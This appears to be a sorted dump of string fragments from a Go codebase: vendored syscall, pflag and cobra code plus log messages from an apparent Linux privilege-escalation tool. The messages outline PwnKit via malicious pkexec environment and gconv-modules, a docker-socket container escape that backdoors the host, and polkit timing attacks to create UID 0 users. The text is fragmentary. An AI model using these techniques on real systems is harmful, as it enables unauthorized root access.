"libc_setsid)), 0, 0, 0, 0, 0, 0, 0)"
"libc_setsid,"
"libc_setsid_trampoline_addr(SB), RODATA, $8"
"libc_setsid_trampoline_addr(SB)/8, $libc_setsid_trampoline<>(SB)"
"libc_setsockopt)), 5, uintptr(s), uintptr(level), uintptr(name), val, vallen, 0)"
"libc_setsockopt,"
"libc_setsockopt_trampoline_addr(SB), RODATA, $8"
"libc_setsockopt_trampoline_addr(SB)/8, $libc_setsockopt_trampoline<>(SB)"
"libc_settimeofday)), 1, tv, 0, 0, 0, 0, 0)"
"libc_settimeofday,"
"libc_settimeofday_trampoline_addr(SB), RODATA, $8"
"libc_settimeofday_trampoline_addr(SB)/8, $libc_settimeofday_trampoline<>(SB)"
"libc_setuid)), 1, uintptr(uid), 0, 0, 0, 0, 0)"
"libc_setuid,"
"libc_setuid_trampoline_addr(SB), RODATA, $8"
"libc_setuid_trampoline_addr(SB)/8, $libc_setuid_trampoline<>(SB)"
"libc_setxattr_trampoline_addr(SB), RODATA, $8"
"libc_setxattr_trampoline_addr(SB)/8, $libc_setxattr_trampoline<>(SB)"
"libc_shmat_trampoline_addr(SB), RODATA, $8"
"libc_shmat_trampoline_addr(SB)/8, $libc_shmat_trampoline<>(SB)"
"libc_shmctl_trampoline_addr(SB), RODATA, $8"
"libc_shmctl_trampoline_addr(SB)/8, $libc_shmctl_trampoline<>(SB)"
"libc_shmdt_trampoline_addr(SB), RODATA, $8"
"libc_shmdt_trampoline_addr(SB)/8, $libc_shmdt_trampoline<>(SB)"
"libc_shmget_trampoline_addr(SB), RODATA, $8"
"libc_shmget_trampoline_addr(SB)/8, $libc_shmget_trampoline<>(SB)"
"libc_shutdown)), 2, uintptr(fd), uintptr(how), 0, 0, 0, 0)"
"libc_shutdown,"
"libc_shutdown_trampoline_addr(SB), RODATA, $8"
"libc_shutdown_trampoline_addr(SB)/8, $libc_shutdown_trampoline<>(SB)"
"libc_socket)), 3, uintptr(domain), uintptr(typ), uintptr(proto), 0, 0, 0)"
"libc_socket,"
"libc_socket_trampoline_addr(SB), RODATA, $8"
"libc_socket_trampoline_addr(SB)/8, $libc_socket_trampoline<>(SB)"
"libc_socketpair)), 4, uintptr(domain), uintptr(typ), uintptr(proto), fd, 0, 0)"
"libc_socketpair,"
"libc_socketpair_trampoline_addr(SB), RODATA, $8"
"libc_socketpair_trampoline_addr(SB)/8, $libc_socketpair_trampoline<>(SB)"
"libc_splice)), 6, uintptr(rfd), roff, uintptr(wfd), woff, uintptr(len), uintptr(flags))"
"libc_splice,"
"libc_stat)), 2, _p0, statptr, 0, 0, 0, 0)"
"libc_stat,"
"libc_stat64_trampoline_addr(SB), RODATA, $8"
"libc_stat64_trampoline_addr(SB)/8, $libc_stat64_trampoline<>(SB)"
"libc_stat_trampoline_addr(SB), RODATA, $8"
"libc_stat_trampoline_addr(SB)/8, $libc_stat_trampoline<>(SB)"
"libc_statfs)), 2, _p0, buf, 0, 0, 0, 0)"
"libc_statfs,"
"libc_statfs64_trampoline_addr(SB), RODATA, $8"
"libc_statfs64_trampoline_addr(SB)/8, $libc_statfs64_trampoline<>(SB)"
"libc_statfs_trampoline_addr(SB), RODATA, $8"
"libc_statfs_trampoline_addr(SB)/8, $libc_statfs_trampoline<>(SB)"
"libc_statx)), 5, uintptr(dirfd), _p0, uintptr(flags), uintptr(mask), stat, 0)"
"libc_statx,"
"libc_symlink_trampoline_addr(SB), RODATA, $8"
"libc_symlink_trampoline_addr(SB)/8, $libc_symlink_trampoline<>(SB)"
"libc_symlinkat_trampoline_addr(SB), RODATA, $8"
"libc_symlinkat_trampoline_addr(SB)/8, $libc_symlinkat_trampoline<>(SB)"
"libc_sync)), 0, 0, 0, 0, 0, 0, 0)"
"libc_sync,"
"libc_sync_trampoline_addr(SB), RODATA, $8"
"libc_sync_trampoline_addr(SB)/8, $libc_sync_trampoline<>(SB)"
"libc_sysctl_trampoline_addr(SB), RODATA, $8"
"libc_sysctl_trampoline_addr(SB)/8, $libc_sysctl_trampoline<>(SB)"
"libc_syslog)), 3, uintptr(typ), _p0, uintptr(_lenp0), 0, 0, 0)"
"libc_syslog,"
"libc_time)), 1, t, 0, 0, 0, 0, 0)"
"libc_time,"
"libc_times)), 1, tms, 0, 0, 0, 0, 0)"
"libc_times,"
"libc_truncate)), 2, _p0, uintptr(length), 0, 0, 0, 0)"
"libc_truncate,"
"libc_truncate_trampoline_addr(SB), RODATA, $8"
"libc_truncate_trampoline_addr(SB)/8, $libc_truncate_trampoline<>(SB)"
"libc_umask)), 1, uintptr(mask), 0, 0, 0, 0, 0)"
"libc_umask,"
"libc_umask_trampoline_addr(SB), RODATA, $8"
"libc_umask_trampoline_addr(SB)/8, $libc_umask_trampoline<>(SB)"
"libc_umount)), 1, _p0, 0, 0, 0, 0, 0)"
"libc_umount,"
"libc_uname)), 1, buf, 0, 0, 0, 0, 0)"
"libc_uname,"
"libc_undelete_trampoline_addr(SB), RODATA, $8"
"libc_undelete_trampoline_addr(SB)/8, $libc_undelete_trampoline<>(SB)"
"libc_unlink)), 1, _p0, 0, 0, 0, 0, 0)"
"libc_unlink,"
"libc_unlink_trampoline_addr(SB), RODATA, $8"
"libc_unlink_trampoline_addr(SB)/8, $libc_unlink_trampoline<>(SB)"
"libc_unlinkat)), 3, uintptr(dirfd), _p0, uintptr(flags), 0, 0, 0)"
"libc_unlinkat,"
"libc_unlinkat_trampoline_addr(SB), RODATA, $8"
"libc_unlinkat_trampoline_addr(SB)/8, $libc_unlinkat_trampoline<>(SB)"
"libc_unmount_trampoline_addr(SB), RODATA, $8"
"libc_unmount_trampoline_addr(SB)/8, $libc_unmount_trampoline<>(SB)"
"libc_ustat)), 2, uintptr(dev), ubuf, 0, 0, 0, 0)"
"libc_ustat,"
"libc_utime)), 2, _p0, buf, 0, 0, 0, 0)"
"libc_utime,"
"libc_utimensat)), 4, uintptr(dirfd), _p0, times, uintptr(flag), 0, 0)"
"libc_utimensat,"
"libc_utimensat_trampoline_addr(SB), RODATA, $8"
"libc_utimensat_trampoline_addr(SB)/8, $libc_utimensat_trampoline<>(SB)"
"libc_utimes)), 2, _p0, times, 0, 0, 0, 0)"
"libc_utimes,"
"libc_utimes_trampoline_addr(SB), RODATA, $8"
"libc_utimes_trampoline_addr(SB)/8, $libc_utimes_trampoline<>(SB)"
"libc_wait4)), 4, uintptr(pid), status, uintptr(options), rusage, 0, 0)"
"libc_wait4,"
"libc_wait4_trampoline_addr(SB), RODATA, $8"
"libc_wait4_trampoline_addr(SB)/8, $libc_wait4_trampoline<>(SB)"
"libc_write)), 3, uintptr(fd), _p0, uintptr(_lenp0), 0, 0, 0)"
"libc_write,"
"libc_write_trampoline_addr(SB), RODATA, $8"
"libc_write_trampoline_addr(SB)/8, $libc_write_trampoline<>(SB)"
"library](https://github.com/spf13/pflag), a fork of the flag standard library"
"like, we welcome any contributions. Fork this library and submit a pull"
"line := """""
"line := fmt.Sprintf(format, args...)"
"line = fmt.Sprintf(""      --%s"", flag.Name)"
"line = fmt.Sprintf(""  -%s, --%s"", flag.Shorthand, flag.Name)"
"line, err = t.readLine()"
"line, lineOk = t.handleKey(key)"
"lines := make([]string, 0, len(f.formal))"
"lines := strings.Split(string(data), """
"lines = append(lines, line)"
"linger), "
"linger, err"
"linkat(int fd1, const char "
"linkedToken)), uint32(unsafe.Sizeof(linkedToken)), "
"list := make(sort.StringSlice, len(flags))"
"list, size_t size)"
"listen(int s, int backlog)"
"listen(s Handle, backlog int32) (err error) [failretval==socket_error] = ws2_32.listen"
"listxattr(path string, dest "
"lo, hi := offs2lohi(offset)"
"localSockaddr, "
"lock, const int "
"log.Printf(""Adding env var(s)..."")"
"log.Printf(""Attempting authentication as %s..."", username)"
"log.Printf(""Attempting authentication as new user..."")"
"log.Printf(""Attempting escalation to root..."")"
"log.Printf(""Attempting to create user '%s' by forcing UID=0..."", username)"
"log.Printf(""Attempting to install '%s' by forcing UID=0..."", name)"
"log.Printf(""Attempting to set root password..."")"
"log.Printf(""Attempting to set user password..."")"
"log.Printf(""Authenticated as %s (%s)!"", user.Username, user.Uid)"
"log.Printf(""Authenticated as %s!"", username)"
"log.Printf(""Authenticated as root!"")"
"log.Printf(""Authenticating with sudo..."
"log.Printf(""Average time for package install to fail authentication is %s"", avgTime)"
"log.Printf(""Average time for password set to fail authentication is %s"", avgTime)"
"log.Printf(""Average time for user creation to fail authentication is %s"", avgTime)"
"log.Printf(""Backdooring host at %s from guest..."", path)"
"log.Printf(""Build failed, looking for existing images instead..."")"
"log.Printf(""Building malicious docker image..."")"
"log.Printf(""C compiler not available, using precompiled shared object..."")"
"log.Printf(""Checking permissions..."")"
"log.Printf(""Cleaning up image..."")"
"log.Printf(""Compiling shared object..."")"
"log.Printf(""Creating evil container..."")"
"log.Printf(""Docker socket at %s is writable!"", v.sockPath)"
"log.Printf(""Dropping you into a shell..."")"
"log.Printf(""Exploit failed with image '%s'"", image)"
"log.Printf(""Finished attempting to set password."")"
"log.Printf(""Kernel version %s is vulnerable!"", ver)"
"log.Printf(""Package '%s' is not installed, trying to force installation via packagekit..."", name)"
"log.Printf(""Package '%s' was installed!"", name)"
"log.Printf(""Please exit the shell once you are finished to ensure the contents of /etc/passwd is restored."")"
"log.Printf(""Please wait "
"log.Printf(""Polkit version is vulnerable!"")"
"log.Printf(""Removing backdoor from host..."")"
"log.Printf(""Removing container..."")"
"log.Printf(""Restoring contents of /etc/passwd..."")"
"log.Printf(""Running payload..."")"
"log.Printf(""Sampling timing of package installation command..."")"
"log.Printf(""Sampling timing of password set command..."")"
"log.Printf(""Sampling timing of user creation command..."")"
"log.Printf(""Setting up filesystem tree..."")"
"log.Printf(""Setting up terminal..."")"
"log.Printf(""Setting up tty..."")"
"log.Printf(""Starting %s with malicious environment variables set..."", pkexecPath)"
"log.Printf(""Starting command with pty..."")"
"log.Printf(""Starting evil container..."")"
"log.Printf(""Starting root shell..."")"
"log.Printf(""Starting shell..."")"
"log.Printf(""User '%s' was created with UID (%s)!"", user.Username, user.Uid)"
"log.Printf(""Using command '%s'..."", command)"
"log.Printf(""Writing local gconv-modules..."")"
"log.Printf(""Writing payload..."
"log.Printf(""Writing payload..."")"
"log.Printf(""Writing temporary file..."")"
"long long lseek(int, long long, int)"
"long long lseek64(int, long long, int)"
"long long splice(int, uintptr_t, int, uintptr_t, int, int)"
"lseek(int fd, int PAD, off_t offset, int whence)"
"lstat(path string, st "
"lstat(path string, stat "
"m = append(m, 'A')"
"m = append(m, 'B')"
"m = append(m, 'C')"
"m = append(m, 'D')"
"m = append(m, []rune(strconv.Itoa(down))...)"
"m = append(m, []rune(strconv.Itoa(left))...)"
"m = append(m, []rune(strconv.Itoa(right))...)"
"m = append(m, []rune(strconv.Itoa(up))...)"
"m = append(m, int(d))"
"m = append(m, keyEscape, '[')"
"m = append(m, keyEscape, '[', 'A')"
"m = append(m, keyEscape, '[', 'B')"
"m = append(m, keyEscape, '[', 'C')"
"m = append(m, keyEscape, '[', 'D')"
"machineNameUTF16, err = UTF16PtrFromString(machineName)"
"maj, min, err := majmin()"
"major, err = strconv.Atoi(string(v.Release[0]))"
"majorVersion, "
"make([]byte, absoluteSDSize)[0]))"
"make([]byte, daclSize)[0]))"
"make([]byte, groupSize)[0]))"
"make([]byte, ownerSize)[0]))"
"make([]byte, saclSize)[0]))"
"make([]byte, selfRelativeSDSize)[0]))"
"map[string]int, name string, value map[string]int, usage string) {"
"map[string]int, name, shorthand string, value map[string]int, usage string) {"
"map[string]int64, name string, value map[string]int64, usage string) {"
"map[string]int64, name, shorthand string, value map[string]int64, usage string) {"
"map[string]string, name string, value map[string]string, usage string) {"
"map[string]string, name, shorthand string, value map[string]string, usage string) {"
"mask, int flags)"
"master, err := isptmaster(f.Fd())"
"matched = append(matched, registration)"
"matches = append(matches, cmd)"
"me, err := os.Executable()"
"metadata"")"
"metadata: matches[10],"
"mib := []_C_int{CTL_KERN, KERN_OSTYPE}"
"mib = []_C_int{CTL_HW, HW_MACHINE}"
"mib = []_C_int{CTL_KERN, KERN_HOSTNAME}"
"mib = []_C_int{CTL_KERN, KERN_OSRELEASE}"
"mib = []_C_int{CTL_KERN, KERN_VERSION}"
"mib = append(mib, CTL_QUERY)"
"mib = append(mib, _C_int(a))"
"mib = append(mib, _C_int(node.Num))"
"mib, err := nametomib(name)"
"mib, err := sysctlmib(name)"
"mib, err := sysctlmib(name, args...)"
"mid, flags)"
"minor, err := strconv.Atoi(minorStr)"
"minor, err = strconv.Atoi(string(v.Release[2]))"
"minorStr := strings.Split(versionBits[1], ""-"")[0]"
"minorVersion, "
"missingFlagNames = append(missingFlagNames, pflag.Name)"
"mkasm=""go run mkasm_darwin.go"""
"mkdirat(int fd, const char "
"mkerrors=""$mkerrors -m32"""
"mkerrors=""$mkerrors -m64"""
"mkerrors=""$mkerrors -maix32"""
"mkerrors=""$mkerrors -maix64"""
"mkerrors=""$mkerrors"""
"mkerrors=""./mkerrors.sh"""
"mkfifoat(int fd, const char "
"mknod(path string, mode uint32, dev int) (err error)"
"mknodat(fd int, path string, mode uint32, dev int) (err error)"
"mknodat(int fd, const char "
"mknodat_freebsd12(fd int, path string, mode uint32, dev uint64) (err error)"
"mksyscall=""go run mksyscall.go -dragonfly"""
"mksyscall=""go run mksyscall.go -l32 -arm"""
"mksyscall=""go run mksyscall.go -l32 -netbsd -arm"""
"mksyscall=""go run mksyscall.go -l32 -netbsd"""
"mksyscall=""go run mksyscall.go -l32 -openbsd -arm"""
"mksyscall=""go run mksyscall.go -l32 -openbsd"""
"mksyscall=""go run mksyscall.go -l32 -plan9 -tags plan9,386"""
"mksyscall=""go run mksyscall.go -l32 -plan9 -tags plan9,amd64"""
"mksyscall=""go run mksyscall.go -l32 -plan9 -tags plan9,arm"""
"mksyscall=""go run mksyscall.go -l32"""
"mksyscall=""go run mksyscall.go -netbsd"""
"mksyscall=""go run mksyscall.go -openbsd"""
"mksyscall=""go run mksyscall.go"""
"mksyscall=""go run mksyscall_aix_ppc.go -aix"""
"mksyscall=""go run mksyscall_aix_ppc64.go -aix"""
"mksyscall=""go run mksyscall_solaris.go"""
"mksysctl="""""
"mksysctl=""go run mksysctl_openbsd.go"""
"mksysnum=""./mksysnum_plan9.sh /n/sources/plan9/sys/src/libc/9syscall/sys.h"""
"mksysnum=""go run mksysnum.go 'http://cvsweb.netbsd.org/bsdweb.cgi/"
"mksysnum=""go run mksysnum.go 'https://cvsweb.openbsd.org/cgi-bin/cvsweb/"
"mksysnum=""go run mksysnum.go 'https://gitweb.dragonflybsd.org/dragonfly.git/blob_plain/HEAD:/sys/kern/syscalls.master'"""
"mksysnum=""go run mksysnum.go 'https://svn.freebsd.org/base/stable/11/sys/kern/syscalls.master'"""
"mktypes=""GOARCH=$GOARCH go tool cgo -godefs -- -fsigned-char"""
"mktypes=""GOARCH=$GOARCH go tool cgo -godefs"""
"mktypes=""XXX"""
"mmap   func(addr, length uintptr, prot, flags, fd int, offset int64) (uintptr, error)"
"mmap(addr uintptr, length uintptr, prot int, flag int, fd int, pos int64) (ret uintptr, err error)"
"mmap(addr uintptr, length uintptr, prot int, flags int, fd int, offset int64) (xaddr uintptr, err error) = mmap64"
"mmap(addr uintptr, length uintptr, prot int, flags int, fd int, offset int64) (xaddr uintptr, err error)"
"mmap2(addr uintptr, length uintptr, prot int, flags int, fd int, pageOffset uintptr) (xaddr uintptr, err error)"
"mmap:   mmap,"
"mmap_args := [6]uintptr{addr, length, uintptr(prot), uintptr(flags), uintptr(fd), uintptr(offset)}"
"mmap_args[0])), 0, 0)"
"mmapper) Mmap(fd int, offset int64, length int, prot int, flags int) (data []byte, err error) {"
"mmsg, unsigned int vlen, unsigned int flags)"
"mmsg, unsigned int vlen, unsigned int flags, struct timespec "
"mnt_ent_buffer)), buffer_size)"
"modCfgMgr32 = NewLazySystemDLL(""CfgMgr32.dll"")"
"modadvapi32 = NewLazySystemDLL(""advapi32.dll"")"
"modcrypt32  = NewLazySystemDLL(""crypt32.dll"")"
"modctl(int cmd, void "
"moddnsapi   = NewLazySystemDLL(""dnsapi.dll"")"
"modification, are permitted provided that the following conditions are"
"modiphlpapi = NewLazySystemDLL(""iphlpapi.dll"")"
"modkernel32 = NewLazySystemDLL(""kernel32.dll"")"
"modmswsock  = NewLazySystemDLL(""mswsock.dll"")"
"modnetapi32 = NewLazySystemDLL(""netapi32.dll"")"
"modntdll    = NewLazySystemDLL(""ntdll.dll"")"
"modole32    = NewLazySystemDLL(""ole32.dll"")"
"modpsapi    = NewLazySystemDLL(""psapi.dll"")"
"modsechost  = NewLazySystemDLL(""sechost.dll"")"
"modsecur32  = NewLazySystemDLL(""secur32.dll"")"
"modsetupapi = NewLazySystemDLL(""setupapi.dll"")"
"modshell32  = NewLazySystemDLL(""shell32.dll"")"
"moduser32   = NewLazySystemDLL(""user32.dll"")"
"moduserenv  = NewLazySystemDLL(""userenv.dll"")"
"modversion  = NewLazySystemDLL(""version.dll"")"
"modwintrust = NewLazySystemDLL(""wintrust.dll"")"
"modws2_32   = NewLazySystemDLL(""ws2_32.dll"")"
"modwtsapi32 = NewLazySystemDLL(""wtsapi32.dll"")"
"mount(fd int, afd int, old string, flag int, aname string) (err error)"
"mount(source string, target string, fstype string, flags uintptr, data "
"mountSetattr(dirfd int, pathname string, flags uint, attr "
"mqstat, struct mq_attr "
"msg := fmt.Sprintf(""%q shorthand is more than one ASCII character"", flag.Shorthand)"
"msg := fmt.Sprintf(""%s flag redefined: %s"", f.name, flag.Name)"
"msg := fmt.Sprintf(""can not look up shorthand which is more than one ASCII character: %q"", name)"
"msg := fmt.Sprintf(""unable to redefine %q shorthand in %q flagset: it's already used for %q flag"", c, f.name, used.Name)"
"msg = fmt.Sprintf(""[Debug] %s"", msg)"
"msg = fmt.Sprintf(""[Error] %s"", msg)"
"msg, flags)"
"msg, int flags)"
"msg_prio, const struct timespec "
"msg_prio,"
"msg_ptr, size_t msg_len, unsigned "
"msg_ptr, size_t msg_len, unsigned msg_prio)"
"msg_ptr, size_t msg_len, unsigned msg_prio, const struct timespec "
"msg_ptr, size_t msg_len,"
"msg_ptr, size_t msg_len,unsigned msg_prio,"
"msgctl(int msqid, int cmd, struct msqid_ds "
"msgget(key_t key, int msgflg)"
"msgp, size_t msgsz, int msgflg)"
"msgp, size_t msgsz, long msgtyp, int msgflg)"
"msgrcv(int msqid, void "
"msgs = append(msgs, m)"
"msgsnd(int msqid, const void "
"munmap func(addr uintptr, length uintptr) error"
"munmap(addr uintptr, length uintptr) (err error)"
"munmap: munmap,"
"mutuallyExclusive = ""cobra_annotation_mutually_exclusive"""
"n "")"
"n := SizeofSockaddrUnix - 3 // subtract leading Family, Len, terminating NUL."
"n := copy(b, s)"
"n := copy(t.inBuf[:], rest)"
"n := int(pp.Len) - 2 // subtract leading Family, Len"
"n := make([]byte, 0)"
"n := make([]byte, _IOC_PARM_LEN(syscall.TIOCPTYGNAME))"
"n := strings.Count(val, ""="")"
"n = append(n, byte(node.Name[i]))"
"n = convertFromDirents11(buf, oldBuf[:n])"
"n = copy(buf, []byte(s))"
"n = copy(p, l.received)"
"n"" ""$directiveLine"""
"n"" ""$flagPrefix"" ""$comp"""
"n"" ""${activeHelp[@]}"""
"n"" ""${completions[@]}"")"
"n"" ""${out[@]}"")"
"n"" ""${out}"")"
"n"") {"
"n""))"
"n""), 0644)"
"n""), nil"
"n"")[0]"
"n"", ""!/bin/sh"
"n"", """
"n"", ""not red"")"
"n"", ""sh X sh X"
"n"", $2, $2)}"
"n"", args)"
"n"", args...)"
"n"", c.CommandPath())"
"n"", c.Name()))"
"n"", c.Name(), c.Deprecated)"
"n"", commandName))"
"n"", directive)"
"n"", directive.string())"
"n"", e, buf)"
"n"", e, errors[i].name, buf)"
"n"", e, signals[i].name, buf)"
"n"", ext))"
"n"", f.name)"
"n"", flag.Name, flag.Deprecated)"
"n"", flag.Shorthand))"
"n"", flag.Shorthand, flag.ShorthandDeprecated)"
"n"", handlers))"
"n"", input)"
"n"", line)"
"n"", msg))"
"n"", msg), printToStdErr)"
"n"", name))"
"n"", os.Args[0])"
"n"", password)))"
"n"", r, -1)"
"n"", s)"
"n"", substr($2,3), $2)}"
"n"", value))"
"n"", value, cmd.Name()))"
"n"", version.Version)"
"n""},"
"n%[1]s"","
"n' ""/mnt/c/Program Files (x86)/Windows Kits/""/"
"n' read -ra COMPREPLY -d '' < <(compgen -W ""${completions["
"n), "
"n), 4)"
"n, _ := readnum("""
"n, _, err := Syscall(SYS_SOCKETCALL, netRecvFrom, uintptr(unsafe.Pointer("
"n, _, err := Syscall(SYS_SOCKETCALL, netRecvMsg, uintptr(unsafe.Pointer("
"n, _, err := Syscall(SYS_SOCKETCALL, netSendMsg, uintptr(unsafe.Pointer("
"n, _, errno := Syscall6(SYS_VMSPLICE, uintptr(fd), uintptr(p), uintptr(len(iovs)), uintptr(flags), 0, 0)"
"n, b := gbit16(b)"
"n, b := gbit64(b)"
"n, e := GetCurrentDirectory(uint32(len(b)), "
"n, e := Pread(fd, b[:], 0)"
"n, e := socketcall(_RECVFROM, uintptr(s), base, uintptr(len(p)), uintptr(flags), uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(fromlen)))"
"n, e := socketcall(_RECVMSG, uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags), 0, 0, 0)"
"n, e := socketcall(_SENDMSG, uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags), 0, 0, 0)"
"n, err := ExpandEnvironmentStrings(p, "
"n, err := FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM"
"n, err := Getcwd(buf[0:])"
"n, err := await(buf[:])"
"n, err := getgroups(0, nil)"
"n, err := gethostname(buf[:])"
"n, err := l.input.Read(buffer)"
"n, err := pipe("
"n, err := r.Read(make([]byte, readSize))"
"n, err := reader.Read(buf[:])"
"n, err := reader.Read(buffer)"
"n, err := strconv.Atoi(str)"
"n, err := w.Write(make([]byte, writeSize))"
"n, err = GetFullPathName(p, uint32(len(buf)), "
"n, err = Getdents(fd, buf)"
"n, err = Poll(pollfds, msec)"
"n, err = getdirentries(fd, oldBuf, basep)"
"n, err = getdirentries_freebsd12(fd, buf, "
"n, err = getgroups(n, "
"n, err = pread(fd, p, offset)"
"n, err = preadv(fd, iovecs, lo, hi)"
"n, err = preadv(fd, iovecs, off)"
"n, err = preadv2(fd, iovecs, lo, hi, flags)"
"n, err = pwrite(fd, p, offset)"
"n, err = pwritev(fd, iovecs, lo, hi)"
"n, err = pwritev(fd, iovecs, off)"
"n, err = pwritev2(fd, iovecs, lo, hi, flags)"
"n, err = read(fd, p)"
"n, err = readv(fd, iovecs)"
"n, err = t.c.Read(readBuf)"
"n, err = write(fd, p)"
"n, err = writev(fd, iovecs)"
"n, nil"
"n, nil)"
"n, nil, 0)"
"n, oobn, recvflags, err = recvmsgRaw(fd, p, oob, flags, "
"n32, err := recvfrom(fd, p, int32(flags), "
"n========= starting completion logic =========="""
"name := """
"name := make([]byte, _C_SPECNAMELEN)"
"name := make([]byte, len(ptm.Sn))"
"name = """""
"name = ""bools"""
"name = ""float"""
"name = ""int"""
"name = ""ints"""
"name = ""new-flag-name"""
"name = ""strings"""
"name = ""uint"""
"name = ""uints"""
"name = strings.Replace(name, sep, to, -1)"
"name = strings.ReplaceAll(name, "":"", ""__"")"
"name, char "
"name, const char "
"name, const void "
"name, err := ByteSliceFromString(sa.Name)"
"name, flag.Annotations, cmd)"
"name, int oflag, mode_t mode, unsigned int value)"
"name, size_t len)"
"name, socklen_t "
"name, socklen_t namelen)"
"name, u_int namelen, void "
"name, void "
"name,"
"name1, int fd2, const char "
"name2, int flags)"
"name:          name,"
"name: ifr.raw.Ifrn,"
"nameForVar = strings.ReplaceAll(nameForVar, ""-"", ""_"")"
"nameForVar = strings.ReplaceAll(nameForVar, "":"", ""_"")"
"namePtr, err = resolvePtr(name, "
"nameToHandleAt(dirFD int, pathname string, fh "
"name[0])), Len: _C_SPECNAMELEN, Pad_cgo_0: [4]byte{0, 0, 0, 0}}"
"namebuf, size_t namelen)"
"namebuf, u_int namelen)"
"namep, err := BytePtrFromString(name)"
"namep, err := UTF16PtrFromString(name)"
"names = append(names, string(name))"
"namlen, ok := direntNamlen(buf)"
"namlen, ok := direntNamlen(rec)"
"net.IP, name string, value net.IP, usage string) {"
"net.IP, name, shorthand string, value net.IP, usage string) {"
"net.IPMask, name string, value net.IPMask, usage string) {"
"net.IPMask, name, shorthand string, value net.IPMask, usage string) {"
"net.IPNet, name string, value net.IPNet, usage string) {"
"net.IPNet, name, shorthand string, value net.IPNet, usage string) {"
"new build system). However, depending on the OS, you may need to update the"
"new, size_t newlen)"
"newLine := make([]rune, len(t.line), 2"
"newLine, newPos, completeOk := t.AutoCompleteCallback(prefix"
"new_address, size_t new_size, int flags)"
"newoffset)), uintptr(whence), 0)"
"newoffset, e := seek(0, fd, offset, whence)"
"newoffset, errno := seek(fd, offset, whence)"
"nextEpfd: 0,"
"nfd, err = accept(fd, "
"nfd, err = accept4(fd, "
"nfd, sa, _ := Accept(fd)"
"nil, "
"nil,"
"nlPos := strings.LastIndex(s[:i], """
"nn, err = w.Write(buf[:todo])"
"no-charge, royalty-free, irrevocable (except as stated in this section)"
"noDesc, compCmdNoDescFlagName, compCmdNoDescFlagDefault, compCmdNoDescFlagDesc)"
"nodes = make([]Sysctlnode, olen/sz)"
"nodes, err := sysctlNodes(mib)"
"notice, this list of conditions and the following disclaimer."
"now, seq, err := GetTime()"
"nsa, struct sigaction "
"nsid, a, err := xattrnamespace(attr)"
"nss, struct sigaltstack "
"nt9uPWrUEbA="""
"nts, nil"
"nts, s8)"
"ntstatus=""$(printf '%s"
"nu.UUID, nu.Valid = Nil, false"
"nulli := bytes.IndexByte(arr, 0)"
"numLanguages, "
"nvar pwnkit_%s_sharedobj = []byte{"","
"o[0]), uintptr(SizeofTCPRepairOpt"
"obj, int op, u_long val, void "
"of this software and associated documentation files (the ""Software""), to deal"
"off)), uintptr(whence), 0)"
"off, err = Seek(fd, 0, 1 /"
"offset), uintptr(("
"offset), uintptr(count), 0, uintptr(unsafe.Pointer("
"offset)>>32), uintptr(count), 0, uintptr(unsafe.Pointer("
"offset, "
"offset, int(w.Fd()), nil, 1, 0)"
"ok, _, e1 := Process32First.Call(snapshot, uintptr(unsafe.Pointer("
"ok, _, e1 = Process32Next.Call(snapshot, uintptr(unsafe.Pointer("
"old, int newfd, char "
"old, size_t "
"oldBuf := make([]byte, oldBufLen)"
"oldBuf = make([]statfs_freebsd11_t, n)"
"oldBufLen := roundup(len(buf)/4, _dirblksiz)"
"oldStat, flags)"
"oldState, err := term.MakeRaw(int(os.Stdin.Fd()))"
"oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))"
"oldState, nil"
"old_address, size_t old_size, void "
"oldlenp, const void "
"oldlenp, void "
"oldp, err := BytePtrFromString(old)"
"olen, qp, sz)"
"op := []rune{keyEscape, '[', 'K'}"
"op:       cop.op,"
"open(path string, mode int) (fd int, err error)"
"open(path string, mode int, perm uint32) (fd int, err error) = SYS___OPEN_A"
"openByHandleAt(mountFD int, fh "
"openat(dirfd int, path string, flags int, mode uint32) (fd int, err error)"
"openat(int fd, const char "
"openat2(dirfd int, path string, open_how "
"ops := make([]string, 0, len(constraintOperators))"
"ops = append(ops, regexp.QuoteMeta(k))"
"original: v,"
"os.File) (rows, cols int, err error) {"
"os.File) (string, error) {"
"os.File, "
"os.File, err error) {"
"os.File, error) {"
"os.File, mod string) error {"
"os.File, w "
"os.File, ws "
"os.O_WRONLY, 0644)"
"os.Stderr,"
"os.Stdin,"
"os.Stdout,"
"osa, const void "
"osreldateOnce.Do(func() { osreldate, _ = SysctlUint32(""kern.osreldate"") })"
"otherInt, err = strconv.ParseInt(preOther, 10, 64)"
"otherPreReleaseMeta := strings.Split(other, ""."")"
"ou, fd_set "
"oucp, const struct __ucontext "
"out := flag.NewFlagSet(c.Name(), flag.ContinueOnError)"
"out := make([]bool, 0, len(boolStrSlice))"
"out := make([]bool, len(ss))"
"out := make([]bool, len(val))"
"out := make([]float32, len(ss))"
"out := make([]float32, len(val))"
"out := make([]float64, len(ss))"
"out := make([]float64, len(val))"
"out := make([]int, len(ss))"
"out := make([]int, len(val))"
"out := make([]int32, len(ss))"
"out := make([]int32, len(val))"
"out := make([]int64, len(ss))"
"out := make([]int64, len(val))"
"out := make([]net.IP, 0, len(ipStrSlice))"
"out := make([]net.IP, len(ss))"
"out := make([]net.IP, len(val))"
"out := make([]string, len("
"out := make([]string, len(val))"
"out := make([]time.Duration, len(ss))"
"out := make([]time.Duration, len(val))"
"out := make([]uint, len(ss))"
"out := make([]uint, len(val))"
"out := make(map[string]int, len(ss))"
"out := make(map[string]int64, len(ss))"
"out := make(map[string]string, len(ss))"
"out = append(out, b)"
"out = append(out, ip)"
"out, _ := writeAsCSV(boolStrSlice)"
"out, _ := writeAsCSV(ipStrSlice)"
"out, err := exec.Command(""sh"", ""-c"", ""apt info policykit-1 "
"outFile, err := os.Create(filename)"
"outShorts = """""
"out[0])), Len: uint32(countin)}"
"out[0])), Len: uint64(countin)}"
"out[i] = fmt.Sprintf(""%d"", d)"
"out[i] = fmt.Sprintf(""%f"", d)"
"out[i] = fmt.Sprintf(""%s"", d)"
"out[i], err = s.fromString(d)"
"out[i], err = strconv.Atoi(d)"
"out[i], err = strconv.ParseBool(t)"
"out[i], err = strconv.ParseFloat(d, 64)"
"out[i], err = strconv.ParseInt(d, 0, 64)"
"out[i], err = time.ParseDuration(d)"
"out[kv[0]], err = strconv.Atoi(kv[1])"
"out[kv[0]], err = strconv.ParseInt(kv[1], 10, 64)"
"outbufp, size_t outbuflen)"
